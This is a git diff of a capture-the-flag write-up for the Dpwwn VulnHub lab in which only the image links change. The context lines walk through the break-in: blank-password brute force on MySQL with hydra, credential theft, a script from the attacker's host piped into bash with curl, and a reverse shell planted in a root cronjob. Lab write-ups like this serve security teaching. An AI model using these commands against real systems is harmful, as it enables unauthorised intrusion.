@@ -8,7 +8,7 @@ categories: ["writeups"]
 series: []
 showToc: true
 cover:
-  image: "https://cdn.ziomsec.com/dpwwn1/cover.png"
+  image: "https://cdn.ziomsec.com/dpwwn1/cover.webp"
   caption: "Dpwwn VulnHub Challenge"
   alt: "Dpwwn cover"
 platform: "VulnHub"
@@ -39,13 +39,13 @@ nmap -A -p- TARGET --min-rate 10000 -oN dpwwn1.nmap
 | 80       | http        |
 | 3306     | mysql       |
 
-![](https://cdn.ziomsec.com/dpwwn1/1.png)
+![](https://cdn.ziomsec.com/dpwwn1/1.webp)
 
 ## Initial Foothold
 
 I visited the web application running on port 80 through my browser and landed on a testing page.
 
-![](https://cdn.ziomsec.com/dpwwn1/2.png)
+![](https://cdn.ziomsec.com/dpwwn1/2.webp)
 
 I then ran a **ffuf** scan to find hidden files and found an interesting file.
 
@@ -53,11 +53,11 @@ I then ran a **ffuf** scan to find hidden files and found an interesting file.
 ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-file.txt -mc 200,302
 ```
 
-![](https://cdn.ziomsec.com/dpwwn1/3.png)
+![](https://cdn.ziomsec.com/dpwwn1/3.webp)
 
 I then visited the *info.php* endpoint and got the results of `phpinfo()` function.
 
-![](https://cdn.ziomsec.com/dpwwn1/4.png)
+![](https://cdn.ziomsec.com/dpwwn1/4.webp)
 
 This page provided 2 potential usernames, "root" and "apache". I tried connecting to the **mysql** server using these usernames with a blank password and got access as "root".
 
@@ -66,14 +66,14 @@ hydra -l 'apache' -p '' mysql://TARGET
 hydra -l 'root' -p '' mysql://TARGET
 ```
 
-![](https://cdn.ziomsec.com/dpwwn1/5.png)
+![](https://cdn.ziomsec.com/dpwwn1/5.webp)
 
 ```shell
 mysql -u root -H target -p
 # hit enter
 ```
 
-![](https://cdn.ziomsec.com/dpwwn1/6.png)
+![](https://cdn.ziomsec.com/dpwwn1/6.webp)
 
 Here, I found a set of credentials in the *users* table.
 
@@ -83,13 +83,13 @@ show tables;
 select * from users
 ```
 
-![](https://cdn.ziomsec.com/dpwwn1/7.png)
+![](https://cdn.ziomsec.com/dpwwn1/7.webp)
 
-![](https://cdn.ziomsec.com/dpwwn1/8.png)
+![](https://cdn.ziomsec.com/dpwwn1/8.webp)
 
 I used these credentials to connect via **ssh**.
 
-![](https://cdn.ziomsec.com/dpwwn1/9.png)
+![](https://cdn.ziomsec.com/dpwwn1/9.webp)
 
 With this, I gained a foothold on the machine.
 
@@ -104,38 +104,38 @@ To enumerate privilege escalation vectors, I downloaded the **linux smart enumer
 python -m http.server 8080
 ```
 
-![](https://cdn.ziomsec.com/dpwwn1/10.png)
+![](https://cdn.ziomsec.com/dpwwn1/10.webp)
 
 ```shell
 curl http://KALI:8080/lse.sh | /bin/bash
 ```
 
-![](https://cdn.ziomsec.com/dpwwn1/11.png)
+![](https://cdn.ziomsec.com/dpwwn1/11.webp)
 
-![](https://cdn.ziomsec.com/dpwwn1/12.png)
+![](https://cdn.ziomsec.com/dpwwn1/12.webp)
 
 Through this, I discovered that the bash script present in my home directory was being executed as a **cronjob**. Cron jobs are scheduled tasks that are executed automatically after certain conditions are fulfilled.
 
-![](https://cdn.ziomsec.com/dpwwn1/13.png)
+![](https://cdn.ziomsec.com/dpwwn1/13.webp)
 
 ```shell
 cat /etc/crontab
 ```
 
-![](https://cdn.ziomsec.com/dpwwn1/14.png)
+![](https://cdn.ziomsec.com/dpwwn1/14.webp)
 
 The *crontab* confirmed that the bash script was being executed as *root*. To understand the execution schedule, I visited **[crontab guru](https://crontab.guru/)**.
 
-![](https://cdn.ziomsec.com/dpwwn1/15.png)
+![](https://cdn.ziomsec.com/dpwwn1/15.webp)
 
 Since I had permissions to write into the file, I could execute any command as *root*. Hence, I visited **revshells** and selected a bash payload that would get me a reverse shell.
 - https://www.revshells.com/
 
-![](https://cdn.ziomsec.com/dpwwn1/16.png)
+![](https://cdn.ziomsec.com/dpwwn1/16.webp)
 
 I then added this payload to the bash script and started a reverse shell listener using **netcat**.
 
-![](https://cdn.ziomsec.com/dpwwn1/17.png)
+![](https://cdn.ziomsec.com/dpwwn1/17.webp)
 
 ```bash
 rlwrap nc -lnvp 4444
@@ -143,7 +143,7 @@ rlwrap nc -lnvp 4444
 
 After 3 minutes and I got a reverse connection on my **netcat** listener.
 
-![](https://cdn.ziomsec.com/dpwwn1/18.png)
+![](https://cdn.ziomsec.com/dpwwn1/18.webp)
 
 I spawned a **tty** shell and captured the flag from the */root* directory.
 
@@ -152,7 +152,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 cat dpwwn-01-FLAG.txt
 ```
 
-![](https://cdn.ziomsec.com/dpwwn1/19.png)
+![](https://cdn.ziomsec.com/dpwwn1/19.webp)
 
 ## Closure
 
